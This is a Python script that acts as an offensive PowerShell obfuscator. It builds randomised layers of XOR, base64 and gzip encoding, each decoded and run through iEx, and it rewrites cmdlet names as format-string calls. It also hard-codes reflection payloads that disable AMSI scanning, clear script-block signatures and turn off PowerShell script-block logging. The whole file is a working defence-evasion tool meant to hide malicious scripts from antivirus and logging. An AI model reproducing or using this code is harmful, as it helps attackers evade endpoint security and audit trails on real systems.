#!/usr/bin/env python3.8
import base64
import gzip
import random
import string
import sys
import re
import os
import subprocess
import argparse
from clogger import Logger


log = Logger()

DEBUG = False
bypass = [
    """[Ref].Assembly.GetType("Management.Automation.ScriptBlock").GetField("signatures","NonPublic,static").SetValue($null,(New-Object 'Collections.Generic.HashSet[string]'))""",
    """$settings=[Ref].Assembly.GetType("Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null)""",
    """try{$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"] = @{}""",
    """$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"].Add("EnableScriptBlockLogging", "0")""",
    """[Ref].Assembly.GetType('Management.Automation.Amsi'+'Utils').GetField('amsi'+'InitFailed','NonPublic,Static').SetValue($null,$true)"""
    ]

def get_cmdlets():
    log.debug('Getting commandlets')
    if os.path.exists('/usr/bin/pwsh'):
        log.debug('Found powershell core')
        ret = subprocess.check_output('''/usr/bin/pwsh -C "Get-Command * {$_.CommandType -eq 'Cmdlet'} |  select name -expandproperty name"''', shell=True).decode('utf-8').strip()
        return ret.split('\n')
    log.debug('Unable to find powershell core')
    return []

def wrap_try(s):
    log.debug('Getting Wrapping try')
    if type(s) != str:
        s = s.decode('utf-8')
    return 'try{{{0}}}catch{{}}'.format(s)

def build_bypass(l=bypass):
    log.debug('Building Bypass')
    return ';'.join(map(wrap_try,l))

def fs_xor(s, k=None):
    log.debug('Running Forward Single Char XOR')
    if type(s) != str:
        s = s.decode('utf-8')
    if not k:
        k = random.choice(list(string.ascii_letters+string.digits))
    s = ''.join([chr(ord(x) ^ ord(k)) for x in s ]).encode('utf-8')
    return '''$x="";$a=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("{0}"));for($i=0;$i -le $a.Length-1;$i++){{$x+=[char]($a[$i]-bxor\'{1}\'[0])}};iEx($x);'''.lower().format(base64.b64encode(s).decode('utf-8'), k)

def rs_xor(s, k=None):
    log.debug('Running Reverse Single Char XOR')
    if type(s) != str:
        s = s.decode('utf-8')
    if not k:
        k = random.choice(list(string.ascii_letters+string.digits))
    s = ''.join([chr(ord(x) ^ ord(k)) for x in s ])[::-1].encode('utf-8')
    return '''$x="";$a=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("{0}"));for($i=$a.Length;$i--;){{$x+=[char]($a[$i]-bxor\'{1}\'[0])}};iEx($x);'''.lower().format(base64.b64encode(s).decode('utf-8'), k)

def fm_xor(s, k='', length=None):
    log.debug('Running Forward Multi Char XOR')
    if type(s) != str:
        s = s.decode('utf-8')
    if not len(k) or not length:
        length = random.randint(1,99)
        k = ''.join([random.choice(list(string.ascii_letters+string.digits)) for x in range(length)])
    s = ''.join([chr(ord(x) ^ ord(k[i%len(k)])) for i,x in enumerate(s)]).encode('utf-8')
    return '''$x="";$a=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("{0}"));$z=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("{1}"));for($i=0;$i -le $a.Length-1;$i++){{$x+=[char]($a[$i]-bxor $z[$i%$z.length])}};iEx($x);'''.lower().format(base64.b64encode(s).decode('utf-8'), base64.b64encode(k.encode('utf-8')).decode('utf-8'))

def b64(s):
    log.debug('Running Base64')
    if type(s) != bytes:
        s = s.encode('utf-8')
    return 'iEx([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("{0}")))'.lower().format(base64.b64encode(s).decode('utf-8'))

def gz(s):
    log.debug('Running GZIP')
    if type(s) != bytes:
        s = s.encode('utf-8')
    s = gzip.compress(s)
    return '''$i=New-Object IO.MemoryStream(,[Convert]::FromBase64String("{0}"));$o=New-Object IO.MemoryStream;$g=New-Object IO.Compression.GzipStream $i,([IO.Compression.CompressionMode]::Decompress);$g.CopyTo($o);iEx([Text.Encoding]::UTF8.'GetString'($o.ToArray()));'''.lower().format(base64.b64encode(s).decode('utf-8'))

def string_obfu(s):
    log.debug('Running String obfuscation')
    if type(s) != str:
        s = s.decode('utf-8')
    f_strings = []
    find = re.findall('(".{1,}?")|(\'.{1,}?\')',s)
    if find:
        [[f_strings.append(a) for a in x if len(a)] for x in find]
        if f_strings:
            for st in f_strings:
                n = " ({0}) ".format('+'.join([ f'[char]{ord(x)}' for x in st[1:-1]]))
                if len(n)>2:
                    if not '$' in st:
                        s = s.replace(st,n,1)
    return s


funcs = (fm_xor, # multi-byte xor
         rs_xor, # reversed single-byte xor
         b64, # base64
         gz, # gzip
         )

def cmdlet_obfu(s):
    log.debug('Running Commandlet obfuscation')
    if type(s) != str:
        s = s.decode('utf-8')
    for c in get_cmdlets():
        while c in s:
            n = c.strip().lower()
            log.info('Found: {0}'.format(c))
            rand = list(set(n))
            random.shuffle(rand)
            rand = ''.join(rand)
            st = []
            fr = list(["'{0}'".format(a) for a in rand])
            list([st.append('{{{0}}}'.format(rand.find(x))) for x in n])
            cmd = "'{0}'-f{1}".format(''.join(st),','.join(fr))
            if DEBUG:
                print(cmd)
                print(subprocess.check_output('''/usr/bin/pwsh -C "{0}"'''.format(cmd), shell=True).decode('utf-8').strip())
            cmd = '&({0})'.format(cmd)
            log.info('Obfuscated as: "{0}"'.format(cmd))
            s = s.replace(c,cmd,1)
    return s

    

#print(get_cmdlets())




if __name__ == "__main__":
    with open(sys.argv[1],'r') as f:
        c = []
        p = f.read()
        build_bypass()
        p = cmdlet_obfu(p)
        #b = string_obfu(bypass)
        p = string_obfu(p)
        #print(b, file=sys.stderr)
        #gzip first and gzip again after bypasses in place makes sure its smaller
        p = gz(p)
        p = '{0};$x="";{1}'.format('',p)
        p = gz(p)
        
        [ (a:=random.choice(funcs), p:=a(p), c.append( str(a.__name__) )) for _ in range(int(sys.argv[2]))]
        
    
    print(p)
    print("Rounds ran:", file=sys.stderr)
    print('\n'.join(c), file=sys.stderr)


